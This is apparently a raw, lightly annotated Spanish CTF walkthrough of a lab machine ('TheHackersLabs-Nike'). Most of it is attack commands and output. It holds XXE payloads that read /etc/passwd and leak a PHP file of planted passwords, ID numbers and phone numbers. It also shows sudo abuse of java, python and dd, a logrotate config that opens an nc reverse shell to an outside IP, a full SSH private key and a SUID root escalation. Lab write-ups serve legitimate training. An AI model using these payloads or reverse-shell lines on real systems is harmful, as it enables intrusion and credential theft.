varios
GET /upload.php HTTP/1.1
Host: 192.168.56.17
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 156

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY nombre SYSTEM 'file:///etc/passwd' >
]>    
<root>  
  <data>&nombre;</data>
</root>






HTTP/1.1 200 OK
Date: Tue, 24 Feb 2026 21:25:08 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 1384
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY nombre SYSTEM "file:///etc/passwd">
]>
<root>  
  <data>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
mike:x:1000:1000:mike,,,:/home/mike:/bin/rbash
n:x:1001:1001:n,,,:/home/n:/bin/bash
pylon:x:1002:1002:pylon,,,:/home/pylon:/bin/bash
macci:x:1003:1003:macci,,,:/home/macci:/bin/bash
wvverez:x:1004:1004:wvverez,,,:/home/wvverez:/bin/bash
</data>
</root>






------------------------------------------------------------------------------------------------------------------------

GET /upload.php HTTP/1.1
Host: 192.168.56.17
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 168

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY nombre SYSTEM 'http://192.168.56.17/datos.php' >
]>    
<root>  
  <data>&nombre;</data>
</root>


.






HTTP/1.1 200 OK
Date: Tue, 24 Feb 2026 21:32:04 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 360
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/svg+xml

<br />
<b>Warning</b>:  DOMDocument::loadXML(http://192.168.56.17/datos.php): Failed to open stream: HTTP request failed! HTTP/1.0 500 Internal Server Error
 in <b>/var/www/html/upload.php</b> on line <b>13</b><br />
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY nombre SYSTEM "http://192.168.56.17/datos.php">
]>
<root>  
  <data/>
</root>











------------------------------------------------------------------------------------------------------------------------
GET /upload.php HTTP/1.1
Host: 192.168.56.17
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 168

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY nombre SYSTEM 'file:///var/www/html/datos.php' >
]>    
<root>  
  <data>&nombre;</data>
</root>







------------------------------------------------------------------------------------------------------------------------




HTTP/1.1 200 OK
Date: Tue, 24 Feb 2026 21:34:58 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 787
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY nombre SYSTEM "file:///var/www/html/datos.php">
]>
<root>  
  <data><?php $user = "mike";
$pass = "oK)Lpk3#mmK!#p";
$dni_user = "74239813V";
$num_user = "+34 678 912 395";

$user = "wvverez";
$pass = "jKolpmd2f0dmko07x!@kk%";
$dni_user = "679145983X";
$num_user = "+ 34 922 178 452"

$user = "pylon";
$pass = "rp&swp)lkfg23lio";
$dni_user = "632159321M";
$num_user = "+ 34 611 459 112";

$user = "macci";
$pass = "koplsdm$%#jokk*mloker";
$dni_user = "547891239U";
$num_user = "+ 34 678 125 226";

$user = "n";
$pass = "kjlso%#mssa*nmccasca$%";
$dni_user = "432986104B";
$num_user = "+34 911 763 689";

if ($_SERVER['REQUEST_METHOD'] !== 'CLI') {
    http_response_code(403);
    die("Access Denied.");
}
?>
</data>
</root>

------------------------------------------------------------------------------------------------------------------------





ssh -t mike@192.168.56.17 "sh -c '/bin/bash'"

mike@192.168.56.17's password: oK)Lpk3#mmK!#p"
mike@TheHackersLabs-Nike:~$ 
mike@TheHackersLabs-Nike:~$ whoami


------------------------------------------------------------------------------------------------------------------------

mike@TheHackersLabs-Nike:~$  export PATH=$PATH:/usr/bin
mike@TheHackersLabs-Nike:~$  ls
bin  Exploit.class  Exploit.java  Shell.java
mike@TheHackersLabs-Nike:~$ 









public class Exploit {
    public static void main(String[] args) {
        try {
            Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


------------------------------------------------------------------------------------------------------------------------

mike@TheHackersLabs-Nike:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
Matching Defaults entries for mike on TheHackersLabs-Nike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mike may run the following commands on TheHackersLabs-Nike:
    (n) NOPASSWD: /usr/bin/java








┌──(kali㉿kali)-[~/Documents/Nike]
└─$ cat Exploit.java 



public class Exploit {
    public static void main(String[] args) {
        try {
            Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
                                                                                                                               
┌──(kali㉿kali)-[~/Documents/Nike]
└─$ 





------------------------------------------------------------------------------------------------------------------------


mike@TheHackersLabs-Nike:/tmp$ ls
exploit.conf  hsperfdata_mike  systemd-private-0dcabe8b271f475382b2833c84b09e15-apache2.service-tn6Cxe
Exploit.java  hsperfdata_n     systemd-private-0dcabe8b271f475382b2833c84b09e15-systemd-logind.service-Gm171y
f             status           test.log
mike@TheHackersLabs-Nike:/tmp$ cat Exploit.java 
public class Exploit {
    public static void main(String[] args) {
        try {
            Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
mike@TheHackersLabs-Nike:/tmp$ 

------------------------------------------------------------------------------------------------------------------------







mike@TheHackersLabs-Nike:/tmp$ sudo -u n java Exploit.java
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
n@TheHackersLabs-Nike:/tmp$ 



------------------------------------------------------------------------------------------------------------------------


n@TheHackersLabs-Nike:/tmp$ whoami
n
n@TheHackersLabs-Nike:/tmp$ 








n@TheHackersLabs-Nike:/tmp$ sudo -l
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
Matching Defaults entries for n on TheHackersLabs-Nike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User n may run the following commands on TheHackersLabs-Nike:
    (pylon) NOPASSWD: /usr/bin/python3 /opt/suma.py
n@TheHackersLabs-Nike:/tmp$ 







------------------------------------------------------------------------------------------------------------------------


Este script nos pertenece así que lo modificamos para que nos lance una bash

echo 'import os; os.system("/bin/bash")' > /opt/suma.py





n@TheHackersLabs-Nike:/tmp$ echo 'import os; os.system("/bin/bash")' > /opt/suma.py
n@TheHackersLabs-Nike:/tmp$ cat /opt/suma.py
import os; os.system("/bin/bash")
n@TheHackersLabs-Nike:/tmp$ 



------------------------------------------------------------------------------------------------------------------------



n@TheHackersLabs-Nike:/tmp$ 
n@TheHackersLabs-Nike:/tmp$ sudo -u pylon python3 /opt/suma.py
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
pylon@TheHackersLabs-Nike:/tmp$ 
pylon@TheHackersLabs-Nike:/tmp$ whoami
pylon
pylon@TheHackersLabs-Nike:/tmp$ 


------------------------------------------------------------------------------------------------------------------------


pylon@TheHackersLabs-Nike:/tmp$ sudo -l
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
Matching Defaults entries for pylon on TheHackersLabs-Nike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pylon may run the following commands on TheHackersLabs-Nike:
    (macci) NOPASSWD: /usr/sbin/logrotate
pylon@TheHackersLabs-Nike:/tmp$ 







------------------------------------------------------------------------------------------------------------------------

Para trabajar más cómodamente en esta parte, vamos a crear unas ssh keys y volver a conectarnos como pylon con ellas.

Podemos ejecutar logrotate como el usuario macci


Para poder lanzarnos una reverse shell primero vamos a crear un archivo test.log en el directorio /tmp, a este archivo le vamos a añadir contenido aleatorio.

head -c 2000 /dev/urandom > /tmp/test.log



Ahora creamos un archivo de configuración de logrotate que nos va a ejecutar una reverse shell a nuestro equipo, lo llamamos exploit.conf

cat << EOF > /tmp/exploit.conf
/tmp/test.log {
    daily
    size 1k
    firstaction
        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.2.7 443 > /tmp/f &
    endscript
}
EOF





pylon@TheHackersLabs-Nike:/tmp$ head -c 2000 /dev/urandom > /tmp/test.log




pylon@TheHackersLabs-Nike:/tmp$ cat << EOF > /tmp/exploit.conf
/tmp/test.log {
    daily
    size 1k
    firstaction
        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.56.7 4843 > /tmp/f &
    endscript
}
EOF





pylon@TheHackersLabs-Nike:/tmp$ 


------------------------------------------------------------------------------------------------------------------------


Nos ponemos en escucha en nuestra máquina con Netcat

nc -nlvp 4843
Y ejecutamos




sudo -u macci logrotate -s /tmp/status /tmp/exploit.conf

pylon@TheHackersLabs-Nike:/tmp$ sudo -u macci logrotate -s /tmp/status /tmp/exploit.conf
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
error: failed to rename /tmp/test.log to /tmp/test.log.1: Operación no permitida
pylon@TheHackersLabs-Nike:/tmp$ 






┌──(kali㉿kali)-[~/Documents/Nike]
└─$ nc -nlvp 4843                                                        

listening on [any] 4843 ...
connect to [192.168.56.7] from (UNKNOWN) [192.168.56.17] 48082
bash: no se puede establecer el grupo de proceso de terminal (4095): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
macci@TheHackersLabs-Nike:/tmp$ 




macci@TheHackersLabs-Nike:/tmp$ whoami
whoami
macci
macci@TheHackersLabs-Nike:/tmp$ 


------------------------------------------------------------------------------------------------------------------------


macci@TheHackersLabs-Nike:/tmp$ sudo -l
sudo -l
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
Matching Defaults entries for macci on TheHackersLabs-Nike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User macci may run the following commands on TheHackersLabs-Nike:
    (wvverez) NOPASSWD: /usr/bin/dd
macci@TheHackersLabs-Nike:/tmp$ 


------------------------------------------------------------------------------------------------------------------------



macci@TheHackersLabs-Nike:/tmp$ sudo -u wvverez dd if=/home/wvverez/.ssh/id_rsa
sudo -u wvverez dd if=/home/wvverez/.ssh/id_rsa
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1FJlhs9Q8GmHG+/ER9vWiSQJe2wROzXCwPetADlthaEpC7w5Afqm
lJzvKQP5rFzglpHl5HtGkhyYKJ4LMwoH3mAS8r6rIb57GhlAYIB4SsTJGQQPqhcdGcc4RI
PKicCOHiJbu3LxkDHoFcprn53RdrbHJNAhJdly7DFAxH8QVPR1OGHTw8WzL2NE61677Gzm
2weyL2mymuqhYIW4lpaSIqUc64a92huhz6/FP4L1AN1BMNs9VgGe66Kk7RImkZ3nqRC6vx
Rc8ryLKi62H+zSGudW0uQY3hVtcOzly/wluGigdBt9fyEWt1GM0xTw5IAgQconIk0Kp0/g
Y0yi3lX4FwAAA8i19xHctfcR3AAAAAdzc2gtcnNhAAABAQDUUmWGz1DwaYcb78RH29aJJA
l7bBE7NcLA960AOW2FoSkLvDkB+qaUnO8pA/msXOCWkeXke0aSHJgongszCgfeYBLyvqsh
vnsaGUBggHhKxMkZBA+qFx0ZxzhEg8qJwI4eIlu7cvGQMegVymufndF2tsck0CEl2XLsMU
DEfxBU9HU4YdPDxbMvY0TrXrvsbObbB7IvabKa6qFghbiWlpIipRzrhr3aG6HPr8U/gvUA
3UEw2z1WAZ7roqTtEiaRneepELq/FFzyvIsqLrYf7NIa51bS5BjeFW1w7OXL/CW4aKB0G3
1/IRa3UYzTFPDkgCBByiciTQqnT+BjTKLeVfgXAAAAAwEAAQAAAQAhwggKayP/VYf51SFs
G3P80hH/4arLszyH2dlT082qFXmlOAQIYIXj0x/jcZJc6Vd8GS5oKYGK8ajvrFEziEDABp
58ofwrnVGNUL5/mW2G1crzg0XKUWp7EsXLfvjQ9iCigev73caymnzAGjMKadlH+r+nBsB+
eBhhnWMi2uEJ4JonU5hercB4H1NDIG75+U0Jf7Vi+W9l4KWATEyim5t8BZr2lS/1GwG8rt
YKxVs01RxSfGxuY7d+4yTFtkH52v6ripwUpjeSYTmfcYK4Aa9Cr3Rx/4a8lAumWRiiWd+i
f38EOCh2ENelsR57CStY+GGOtQn/tAFGI2dzceTQUb2BAAAAgQCMcpFej8OplGC6/j+Osh
T+gd4Xc/vu8iaEYy+YbUpQYb1D/i11D/rTSK0DR4/n84sODC0Fw2MAvCOc7OM0nYNFH3vb
eGog+Z4I6ze+FPbsx+7VgjF4C/b5V9SxNzxNN/H0DEibxVw74qSfsdIsGoFGSfMQQAiucb
aoEfmbDV/zfQAAAIEA8BsI93kzkit4zPvvALlQbWi20rqUMSdM/xZa0Q6/0HGYLngBrVEg
dPok+JhxhSCoh/EijWt2nLZIG5lTxRSbpkUcm+nnlRRmLkewhZzKvbaVjgbYKPWaUEuNxS
qwqzTIrj64EG8Fp9aQy3OQFGjzxkAIzmdgu3+zwe/f9+YUnWcAAACBAOJghcdNqdVlzOdQ
7igGyJLtuljBz3PoKnlJb3nJep+yyurPf8syVIiHsjzwS8MoO2C3GrEGvlveBdV3oxGXBv
WohDKBY+f9LORJs01E0YOgl5RIqCwlicA4OLpXh2BEKX2Q5oFAnyytoeS/V+Rj3wj0U48O
gPi4cmmPM9wmYXHRAAAADnd2dmVyZXpAZGViaWFuAQIDBA==
-----END OPENSSH PRIVATE KEY-----
3+1 records in
3+1 records out
1823 bytes (1,8 kB, 1,8 KiB) copied, 0,00051245 s, 3,6 MB/s
macci@TheHackersLabs-Nike:/tmp$ 




macci@TheHackersLabs-Nike:/tmp$ 

------------------------------------------------------------------------------------------------------------------------


──(kali㉿kali)-[~/Documents/Nike]
└─$ nano id_rsa 





cat id_rsa     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1FJlhs9Q8GmHG+/ER9vWiSQJe2wROzXCwPetADlthaEpC7w5Afqm
lJzvKQP5rFzglpHl5HtGkhyYKJ4LMwoH3mAS8r6rIb57GhlAYIB4SsTJGQQPqhcdGcc4RI
PKicCOHiJbu3LxkDHoFcprn53RdrbHJNAhJdly7DFAxH8QVPR1OGHTw8WzL2NE61677Gzm
2weyL2mymuqhYIW4lpaSIqUc64a92huhz6/FP4L1AN1BMNs9VgGe66Kk7RImkZ3nqRC6vx
Rc8ryLKi62H+zSGudW0uQY3hVtcOzly/wluGigdBt9fyEWt1GM0xTw5IAgQconIk0Kp0/g
Y0yi3lX4FwAAA8i19xHctfcR3AAAAAdzc2gtcnNhAAABAQDUUmWGz1DwaYcb78RH29aJJA
l7bBE7NcLA960AOW2FoSkLvDkB+qaUnO8pA/msXOCWkeXke0aSHJgongszCgfeYBLyvqsh
vnsaGUBggHhKxMkZBA+qFx0ZxzhEg8qJwI4eIlu7cvGQMegVymufndF2tsck0CEl2XLsMU
DEfxBU9HU4YdPDxbMvY0TrXrvsbObbB7IvabKa6qFghbiWlpIipRzrhr3aG6HPr8U/gvUA
3UEw2z1WAZ7roqTtEiaRneepELq/FFzyvIsqLrYf7NIa51bS5BjeFW1w7OXL/CW4aKB0G3
1/IRa3UYzTFPDkgCBByiciTQqnT+BjTKLeVfgXAAAAAwEAAQAAAQAhwggKayP/VYf51SFs
G3P80hH/4arLszyH2dlT082qFXmlOAQIYIXj0x/jcZJc6Vd8GS5oKYGK8ajvrFEziEDABp
58ofwrnVGNUL5/mW2G1crzg0XKUWp7EsXLfvjQ9iCigev73caymnzAGjMKadlH+r+nBsB+
eBhhnWMi2uEJ4JonU5hercB4H1NDIG75+U0Jf7Vi+W9l4KWATEyim5t8BZr2lS/1GwG8rt
YKxVs01RxSfGxuY7d+4yTFtkH52v6ripwUpjeSYTmfcYK4Aa9Cr3Rx/4a8lAumWRiiWd+i
f38EOCh2ENelsR57CStY+GGOtQn/tAFGI2dzceTQUb2BAAAAgQCMcpFej8OplGC6/j+Osh
T+gd4Xc/vu8iaEYy+YbUpQYb1D/i11D/rTSK0DR4/n84sODC0Fw2MAvCOc7OM0nYNFH3vb
eGog+Z4I6ze+FPbsx+7VgjF4C/b5V9SxNzxNN/H0DEibxVw74qSfsdIsGoFGSfMQQAiucb
aoEfmbDV/zfQAAAIEA8BsI93kzkit4zPvvALlQbWi20rqUMSdM/xZa0Q6/0HGYLngBrVEg
dPok+JhxhSCoh/EijWt2nLZIG5lTxRSbpkUcm+nnlRRmLkewhZzKvbaVjgbYKPWaUEuNxS
qwqzTIrj64EG8Fp9aQy3OQFGjzxkAIzmdgu3+zwe/f9+YUnWcAAACBAOJghcdNqdVlzOdQ
7igGyJLtuljBz3PoKnlJb3nJep+yyurPf8syVIiHsjzwS8MoO2C3GrEGvlveBdV3oxGXBv
WohDKBY+f9LORJs01E0YOgl5RIqCwlicA4OLpXh2BEKX2Q5oFAnyytoeS/V+Rj3wj0U48O
gPi4cmmPM9wmYXHRAAAADnd2dmVyZXpAZGViaWFuAQIDBA==
-----END OPENSSH PRIVATE KEY-----
                                                                           

------------------------------------------------------------------------------------------------------------------------                                                                                                                               
┌──(kali㉿kali)-[~/Documents/Nike]
└─$ ssh -i id_rsa wvverez@192.168.56.17 
Linux TheHackersLabs-Nike 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 17 22:27:10 2026 from 192.168.91.128
wvverez@TheHackersLabs-Nike:~$ 
wvverez@TheHackersLabs-Nike:~$ 
wvverez@TheHackersLabs-Nike:~$ whoami 
wvverez



------------------------------------------------------------------------------------------------------------------------

wvverez@TheHackersLabs-Nike:~$ 
wvverez@TheHackersLabs-Nike:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Nike: Fallo temporal en la resolución del nombre


wvverez@TheHackersLabs-Nike:~$ ls -la
total 32
drwx------ 4 wvverez wvverez 4096 feb 17 22:40 .
drwxr-xr-x 7 root    root    4096 feb 17 13:33 ..
lrwxrwxrwx 1 root    root       9 feb 17 16:13 .bash_history -> /dev/null
-rw-r--r-- 1 wvverez wvverez  220 feb 17 13:33 .bash_logout
-rw-r--r-- 1 wvverez wvverez 3526 feb 17 13:33 .bashrc
-rw-r--r-- 1 wvverez wvverez   30 feb 17 22:40 flag.txt
drwxr-xr-x 3 wvverez wvverez 4096 feb 17 17:43 .local
-rw-r--r-- 1 wvverez wvverez  807 feb 17 13:33 .profile
drwx------ 2 wvverez wvverez 4096 feb 17 16:46 .ssh


------------------------------------------------------------------------------------------------------------------------

wvverez@TheHackersLabs-Nike:~$ cat flag.txt 
JKKADKOD87jdasdbas123mfnajnfd


------------------------------------------------------------------------------------------------------------------------

wvverez@TheHackersLabs-Nike:~$ id 
uid=1004(wvverez) gid=1004(wvverez) grupos=1004(wvverez),100(users),1005(ctf_admins)
wvverez@TheHackersLabs-Nike:~$ id mike
uid=1000(mike) gid=1000(mike) grupos=1000(mike),100(users)
wvverez@TheHackersLabs-Nike:~$ id pylon
uid=1002(pylon) gid=1002(pylon) grupos=1002(pylon),100(users)
wvverez@TheHackersLabs-Nike:~$ id n
uid=1001(n) gid=1001(n) grupos=1001(n),100(users)
wvverez@TheHackersLabs-Nike:~$ 



------------------------------------------------------------------------------------------------------------------------

wvverez@TheHackersLabs-Nike:~$ find / -group ctf_admins 2>/dev/null
/usr/local/bin/sys_monitor
wvverez@TheHackersLabs-Nike:~$ 




vverez@TheHackersLabs-Nike:~$ ls -l /usr/local/bin/sys_monitor
-rwsr-x--- 1 root ctf_admins 16440 feb 17 19:04 /usr/local/bin/sys_monitor
wvverez@TheHackersLabs-Nike:~$ 


------------------------------------------------------------------------------------------------------------------------

# Buscar archivos pertenecientes al grupo ctf_admins
find / -group ctf_admins 2>/dev/null


wvverez@TheHackersLabs-Nike:~$ find / -group ctf_admins 2>/dev/null
/usr/local/bin/sys_monitor
wvverez@TheHackersLabs-Nike:~$ ls -l /usr/local/bin/sys_monitor
-rwsr-x--- 1 root ctf_admins 16440 feb 17 19:04 /usr/local/bin/sys_monitor
wvverez@TheHackersLabs-Nike:~$ 
wvverez@TheHackersLabs-Nike:~$ /usr/local/bin/sys_monitor 3 "bash -p"
root@TheHackersLabs-Nike:~# 


------------------------------------------------------------------------------------------------------------------------


root@TheHackersLabs-Nike:~# 


root@TheHackersLabs-Nike:~# 
root@TheHackersLabs-Nike:~# whoami
root
root@TheHackersLabs-Nike:~# 
root@TheHackersLabs-Nike:~# 
root@TheHackersLabs-Nike:~# cat /root/
.bash_history  .bashrc        .local/        .profile       root.txt       .ssh/          
root@TheHackersLabs-Nike:~# cat /root/root.txt 
AMjakosdamwpdamdn456mcadadnlpsadenda
root@TheHackersLabs-Nike:~# 
root@TheHackersLabs-Nike:~# 
root@TheHackersLabs-Nike:~# 
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
